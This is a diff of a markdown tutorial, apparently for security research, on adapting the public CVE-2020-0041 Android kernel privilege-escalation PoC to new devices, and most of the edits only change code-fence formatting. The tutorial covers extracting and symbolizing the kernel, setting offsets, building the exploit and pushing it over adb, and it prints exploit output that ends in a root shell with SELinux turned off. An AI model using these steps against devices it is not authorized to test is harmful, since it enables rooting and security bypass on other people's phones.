@@ -17,11 +17,12 @@ A common procedure in the industry is the adaptation of privilege escalation exp
 - [Improvements](#improvements)
 
 <a name="requirements">
+
 ## Requirements
 
 * Download the **CVE-2020-0041** PoC exploit that we will be using for the modifications:
 
-```sh
+```bash
 git clone https://github.com/bluefrostsecurity/CVE-2020-0041
 ```
 
@@ -35,7 +36,7 @@ git clone https://github.com/bluefrostsecurity/CVE-2020-0041
 
 * Download [abootimg](https://github.com/ggrandou/abootimg) and compile it:
 
-```sh
+```bash
 git clone https://github.com/ggrandou/abootimg
 cd abootimg
 make
@@ -43,24 +44,25 @@ make
 
 * Download and install [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool using python pip:
 
-```sh
+```bash
 sudo apt install python3-pip
 sudo pip3 install --upgrade lz4 git+https://github.com/marin-m/vmlinux-to-elf
 ```
 
 * In addition, we will need the **Android NDK** in our path in order to compile the exploit. As an example, I have this line on my .zshrc file.
 
-```sh
+```bash
 export NDK="/home/calabres/NDK"
 ```
 </a>
 
 <a name="procedure">
+
 ## Procedure
 
 1. First of all we need to extract the compressed kernel image from the boot.img. For that, we will use the already downloaded tool **abootimg**.
 
-```sh
+```bash
 ./abootimg -x [path_to_boot_img]
 ```
 
@@ -68,7 +70,7 @@ The produced zImage, is an image that contains the compressed Android Kernel.
 
 2. In order to obtain an uncompressed image of the Kernel that contains correct symbols and offsets, use the [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) tool.
 
-```sh
+```bash
 vmlinux-to-elf [path_to_zImage] kernel.elf
 ```
 
@@ -98,11 +100,12 @@ OFFSET_PIPE_FOP
 </a>
 
 <a name="testing">
+
 ## Testing the exploit 
 
 >The exploit can be built by simply running "make" with the Android NDK in the path. It can also be pushed to a phone attached with adb by doing "make all push". Now just run /data/local/tmp/poc from an adb shell to see the exploit running:
 
-```sh
+```bash
 [+] Mapped 200000
 [+] selinux_enforcing before exploit: 1
 [+] pipe file: 0xffffffd9c67c7700
@@ -147,10 +150,10 @@ root_by_cve-2020-0041:/ #
 </a>
 
 <a name="improvements">
+
 ## Improvements
 
 After adapting the exploit, you will obtain a root shell; however, the shell will be very limited and not fully working.
 
 In order to ... //TODO
-
 </a>
